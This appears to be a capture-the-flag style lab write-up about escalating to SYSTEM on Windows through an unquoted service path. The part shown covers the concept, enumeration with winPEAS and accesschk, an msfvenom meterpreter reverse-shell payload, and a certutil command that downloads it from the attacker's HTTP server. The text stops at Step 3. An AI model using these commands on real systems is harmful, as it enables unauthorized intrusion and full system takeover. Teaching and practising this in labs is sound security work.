# Unquoted Path Service

**Date:** June 2026  
**Author:** ShahinSecLab  
**Category:** Privilege Escalation  
**Difficulty:** Easy  
**Tools:** msfvenom, Metasploit, winPEAS, accesschk.exe, certutil

# Table of Contents

- [What is Unquoted Path Service?](#what-is-unquoted-path-service)
- [Why This Attack Works](#why-this-attack-works)
- [What I Needed Before Starting](#what-i-needed-before-starting)
- [What I Understood During the Process](#what-i-understood-during-the-process)
- [Attack Flow](#attack-flow)
- [Step 1 — Finding the Unquoted Path Service](#step-1--finding-the-unquoted-path-service)
- [Step 2 — Finding a Writable Folder in the Path](#step-2--finding-a-writable-folder-in-the-path)
- [Step 3 — Generating a New Payload and Downloading it to the Victim](#step-3--generating-a-new-payload-and-downloading-it-to-the-victim)
- [Step 4 — Copying the Payload and Starting the Service](#step-4--copying-the-payload-and-starting-the-service)
- [Step 5 — Getting a SYSTEM Shell](#step-5--getting-a-system-shell)
- [How Defenders Can Catch This](#how-defenders-can-catch-this)
- [How to Prevent It](#how-to-prevent-it)
- [What I Achieved](#what-i-achieved)

## What is Unquoted Path Service?

Unquoted Path Service is a Windows privilege escalation technique. When a service binary path has spaces in it but no quotes around the full path, Windows does not know exactly where the path ends. So it tries to find the executable by checking multiple locations one by one. If I can drop a malicious file in one of those locations before the real binary, Windows runs mine instead — and since the service runs as SYSTEM, I get a SYSTEM shell.

## Why This Attack Works

Windows handles unquoted paths with spaces in a specific way. Take this path for example:

```bash
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
```

Windows does not read this as one full path. It breaks it up at every space and tries each combination:

```bash
C:\Program.exe
C:\Program Files\Unquoted.exe
C:\Program Files\Unquoted Path Service\Common.exe
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
```

It stops at the first one it finds. So if I drop a file called Common.exe inside C:\Program Files\Unquoted Path Service\, Windows picks it up and runs it as SYSTEM before ever reaching the real binary.

## Lab Setup

```
|       Component      |         Details          |
|----------------------|--------------------------|
| **Attacker Machine** | Kali Linux               |
| **Attacker IP**      | 192.168.5.128            |
| **Victim Machine**   | Windows 10               |
| **Victim IP**        | 192.168.5.129            |
| **Network**          | VMware Host-Only Network |
| **Domain**           | WORKGROUP                |
```

## What I Understood During the Process

While working through this attack I realized that:

- A missing pair of quotes around a service path can lead to full SYSTEM access
- The attack only works if I can write to one of the folders Windows checks
- winPEAS finds these misconfigurations automatically and flags them clearly
- This is one of the most common privilege escalation paths found in real Windows environments
- Fixing it is as simple as adding quotes around the binary path

## Attack Flow

```
winPEAS flagged unquotedsvc service — unquoted path with spaces detected
                        ↓
Checked service config — runs as LocalSystem (SYSTEM)
                        ↓
Checked folder permissions along the binary path
                        ↓
Found C:\Program Files\Unquoted Path Service\ is writable by normal users
                        ↓
Generated malicious payload rev.exe on Kali with msfvenom
                        ↓
Hosted payload over HTTP with Python HTTP server
                        ↓
Downloaded rev.exe to victim using certutil
                        ↓
Copied rev.exe to writable folder as Common.exe
                        ↓
Started Metasploit listener on port 4444
                        ↓
Started unquotedsvc service
                        ↓
Windows found Common.exe first and ran it as SYSTEM
                        ↓
Metasploit caught the shell
                        ↓
whoami → nt authority\system
```

## Step 1 — Finding the Unquoted Path Service

`winPEAS` flagged unquotedsvc while scanning — it showed the binary path had spaces but no quotes around it.

```bash
C:\PrivEsc>winPEASany.exe
```

**Output:**

```
unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected 
```

<p align="center">
  <img src="/Windows-Privilege-Escalation/unquoted path service/images/step1-1.png" width="600">
</p>

### Checked the Service Configuration

```bash
C:\PrivEsc> sc qc unquotedsvc
```

***Output:**

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

```markdown
| **Field** | **Value** | **What it Means** |
|:---------|:----------|:------------------|
| **BINARY_PATH_NAME** | `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe` | The service executable path is **not enclosed in quotation marks**, making it vulnerable to an **Unquoted Service Path** attack. |
| **SERVICE_START_NAME** | `LocalSystem` | The service runs under the **LocalSystem (SYSTEM)** account, so successful exploitation results in **SYSTEM-level privileges**. |
```

## Checked Write Permissions on C:\

```bash
C:\PrivEsc>.\accesschk /accepteula -uwdq C:\
```

**Output:**

```
C:\
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Administrators
  RW NT AUTHORITY\SYSTEM
```
No write access for normal users on C:\ — I needed to check deeper.

<p align="center">
  <img src="/Windows-Privilege-Escalation/unquoted path service/images/step1-2.png" width="600">
</p>

## Step 2 — Finding a Writable Folder in the Path

I checked each folder in the service path one by one.

Check C:\Program Files\

```bash
C:\PrivEsc>.\accesschk /accepteula -uwdq "C:\Program Files\"
```

**Output:**

```
C:\Program Files
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```
No write access for normal users here either.

<p align="center">
  <img src="/Windows-Privilege-Escalation/unquoted path service/images/step2-1.png" width="600">
</p>

Check C:\Program Files\Unquoted Path Service\

```bash
C:\PrivEsc>.\accesschk /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

**Output:**

```
C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```
`RW BUILTIN\Users` — any normal user on the machine can write to this folder. That is exactly what I needed.

### Step 3 — Generating a New Payload and Downloading it to the Victim

Generated Payload on Kali

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=4444 -f exe -o rev.exe
``` 

**Output:**

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: rev.exe
```

<p align="center">
  <img src="/Windows-Privilege-Escalation/unquoted path service/images/step3-1.png" width="600">
</p>

Started Python HTTP Server on Kali

```bash
python3 -m http.server 80
```

**Output:**

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.5.144 - - [20/Jun/2026 22:51:35] "GET / HTTP/1.1" 200 -
```

Downloaded the Payload on the Victim Machine

```bash
certutil -urlcache -split -f http://192.168.5.128/rev.exe rev.exe
```

**Output:**

```
****  Online  ****
  0000  ...
  1e00
CertUtil: -URLCache command completed successfully.
```
<p align="center">
  <img src="/Windows-Privilege-Escalation/unquoted path service/images/step3-2.png" width="600">
</p>
